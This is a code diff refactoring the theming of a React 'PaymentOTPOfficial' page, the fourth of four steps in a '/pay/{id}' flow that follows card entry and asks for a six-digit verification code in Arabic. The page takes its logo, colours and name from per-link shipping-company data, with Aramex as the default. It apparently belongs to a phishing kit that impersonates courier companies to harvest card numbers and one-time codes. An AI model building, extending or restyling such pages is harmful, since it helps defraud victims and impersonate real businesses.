@@ -1,18 +1,17 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
-import { getCompanyById } from "@/lib/shippingCompanies";
 import { Shield, ArrowLeft, RotateCcw } from "lucide-react";
+import { useTheme } from "@/themes/ThemeContext";
 
 const PaymentOTPOfficial = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const { theme } = useTheme();
 
   const serviceKey = linkData?.payload?.service_key || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
   const [otp, setOtp] = useState("");
@@ -44,79 +43,44 @@ const PaymentOTPOfficial = () => {
   };
 
   const handleBack = () => {
-    navigate(`/pay/${id}/card-input`);
+    navigate(`/pay/${id}/card`);
   };
-
-  // Get company data and styling
-  const company = getCompanyById(serviceKey);
-  const getCompanyStyles = () => {
-    if (!company) {
-      // Fallback styles
-      return {
-        gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
-        background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/aramex-logo.svg',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
-        inputFocus: '#E31E24',
-      };
-    }
-
-    return {
-      gradient: company.colors.gradient,
-      background: company.colors.background,
-      cardBg: '#FFFFFF',
-      primaryText: '#1A1A1A',
-      secondaryText: '#6B6B6B',
-      logo: company.logo,
-      fontFamily: company.fontFamily,
-      headerBg: '#FFFFFF',
-      borderColor: '#E0E0E0',
-      buttonShadow: `0 4px 12px ${company.colors.primary}40`,
-      inputFocus: company.colors.primary,
-    };
-  };
-
-  const companyStyles = getCompanyStyles();
 
   return (
     <div
       className="min-h-screen"
       style={{
-        background: companyStyles.background,
-        fontFamily: companyStyles.fontFamily,
+        background: 'var(--color-background)',
+        fontFamily: 'var(--font-family)',
       }}
     >
       {/* Official Company Header */}
       <header
         className="sticky top-0 z-50 w-full border-b"
         style={{
-          backgroundColor: companyStyles.headerBg,
-          borderBottomColor: companyStyles.borderColor,
-          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
+          backgroundColor: 'var(--color-surface)',
+          borderBottomColor: 'var(--color-border)',
+          height: 'var(--header-height)',
+          padding: 'var(--header-padding)',
+          boxShadow: 'var(--header-box-shadow)',
         }}
       >
-        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
+        <div className="container mx-auto h-full flex items-center justify-between">
           <div className="flex items-center gap-3 sm:gap-4">
             <button onClick={handleBack} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
-              <ArrowLeft className="w-5 h-5" style={{ color: companyStyles.primaryText }} />
+              <ArrowLeft className="w-5 h-5" style={{ color: 'var(--color-text)' }} />
             </button>
             <img
-              src={companyStyles.logo}
+              src={theme?.logo}
               alt={serviceName}
               className="h-8 sm:h-12 w-auto object-contain"
             />
           </div>
           <div className="text-right">
-            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
+            <h1 className="text-lg sm:text-xl font-bold" style={{ color: 'var(--color-text)' }}>
               {serviceName}
             </h1>
-            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
+            <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
               التحقق من الهوية
             </p>
           </div>
@@ -125,7 +89,7 @@ const PaymentOTPOfficial = () => {
         <div
           className="h-1 w-full"
           style={{
-            background: companyStyles.gradient,
+            background: 'var(--gradient)',
           }}
         />
       </header>
@@ -137,20 +101,20 @@ const PaymentOTPOfficial = () => {
           <div
             className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
             style={{
-              backgroundColor: companyStyles.cardBg,
-              borderColor: companyStyles.borderColor,
+              backgroundColor: 'var(--color-surface)',
+              borderColor: 'var(--color-border)',
             }}
           >
             <div className="flex items-center justify-between mb-3">
               <span
                 className="text-sm font-semibold"
-                style={{ color: companyStyles.primaryText }}
+                style={{ color: 'var(--color-text)' }}
               >
                 الخطوة 4 من 4
               </span>
               <span
                 className="text-xs"
-                style={{ color: companyStyles.secondaryText }}
+                style={{ color: 'var(--color-text-secondary)' }}
               >
                 {serviceName}
               </span>
@@ -160,7 +124,7 @@ const PaymentOTPOfficial = () => {
                 className="h-full rounded-full transition-all duration-500"
                 style={{
                   width: '100%',
-                  background: companyStyles.gradient,
+                  background: 'var(--gradient)',
                 }}
               />
             </div>
@@ -171,20 +135,22 @@ const PaymentOTPOfficial = () => {
             <div
               className="border rounded-xl p-6 sm:p-8 mb-6"
               style={{
-                backgroundColor: companyStyles.cardBg,
-                borderColor: companyStyles.borderColor,
-                boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
+                backgroundColor: 'var(--color-surface)',
+                borderColor: 'var(--color-border)',
+                borderRadius: 'var(--card-border-radius)',
+                padding: 'var(--card-padding)',
+                border: 'var(--card-border)',
               }}
             >
               <h2
                 className="text-xl font-bold mb-2 text-center"
-                style={{ color: companyStyles.primaryText }}
+                style={{ color: 'var(--color-text)' }}
               >
                 أدخل رمز التحقق
               </h2>
               <p
                 className="text-sm mb-6 text-center"
-                style={{ color: companyStyles.secondaryText }}
+                style={{ color: 'var(--color-text-secondary)' }}
               >
                 تم إرسال رمز التحقق إلى رقم هاتفك
               </p>
@@ -194,7 +160,7 @@ const PaymentOTPOfficial = () => {
                 <div>
                   <label
                     className="block text-sm font-semibold mb-3 text-center"
-                    style={{ color: companyStyles.primaryText }}
+                    style={{ color: 'var(--color-text)' }}
                   >
                     رمز التحقق (OTP)
                   </label>
@@ -207,14 +173,14 @@ const PaymentOTPOfficial = () => {
                       maxLength={6}
                       className="w-full px-6 py-4 border-2 rounded-lg text-lg text-center font-bold tracking-[0.5em] transition-all focus:outline-none focus:ring-2"
                       style={{
-                        borderColor: error ? '#E31837' : branding.colors.primary,
-                        fontFamily: companyStyles.fontFamily,
-                        '--tw-ring-color': companyStyles.inputFocus,
+                        borderColor: error ? '#E31837' : 'var(--color-primary)',
+                        fontFamily: 'var(--font-family)',
+                        '--tw-ring-color': 'var(--color-primary)',
                       } as React.CSSProperties}
                     />
                     <Shield
                       className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
-                      style={{ color: companyStyles.secondaryText }}
+                      style={{ color: 'var(--color-text-secondary)' }}
                     />
                   </div>
                   {error && (
@@ -228,19 +194,19 @@ const PaymentOTPOfficial = () => {
                 <div
                   className="flex items-start gap-3 p-4 rounded-lg border"
                   style={{
-                    backgroundColor: `${branding.colors.primary}08`,
-                    borderColor: `${branding.colors.primary}30`,
+                    backgroundColor: `rgba(var(--color-primary-rgb), 0.08)`,
+                    borderColor: `rgba(var(--color-primary-rgb), 0.3)`,
                   }}
                 >
-                  <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" style={{ color: branding.colors.primary }} />
+                  <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" style={{ color: 'var(--color-primary)' }} />
                   <div>
                     <div
                       className="font-semibold text-sm mb-1"
-                      style={{ color: companyStyles.primaryText }}
+                      style={{ color: 'var(--color-text)' }}
                     >
                       أمان إضافي
                     </div>
-                    <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
+                    <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                       رمز التحقق صالح لمدة 5 دقائق فقط. لا تشارك هذا الرمز مع أي شخص.
                     </div>
                   </div>
@@ -254,9 +220,12 @@ const PaymentOTPOfficial = () => {
               disabled={otp.length !== 6 || isVerifying}
               className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
               style={{
-                background: companyStyles.gradient,
-                boxShadow: companyStyles.buttonShadow,
-                fontFamily: companyStyles.fontFamily,
+                background: 'var(--gradient)',
+                padding: 'var(--button-padding)',
+                borderRadius: 'var(--button-border-radius)',
+                fontWeight: 'var(--button-font-weight)',
+                textTransform: 'var(--button-text-transform)',
+                fontFamily: 'var(--font-family)',
               }}
             >
               {isVerifying ? (
@@ -279,9 +248,9 @@ const PaymentOTPOfficial = () => {
                 onClick={handleResend}
                 className="inline-flex items-center gap-2 px-4 py-2 rounded-lg border transition-all hover:bg-gray-50 text-sm font-semibold"
                 style={{
-                  color: branding.colors.primary,
-                  borderColor: branding.colors.primary,
-                  fontFamily: companyStyles.fontFamily,
+                  color: 'var(--color-primary)',
+                  borderColor: 'var(--color-primary)',
+                  fontFamily: 'var(--font-family)',
                 }}
               >
                 <RotateCcw className="w-4 h-4" />
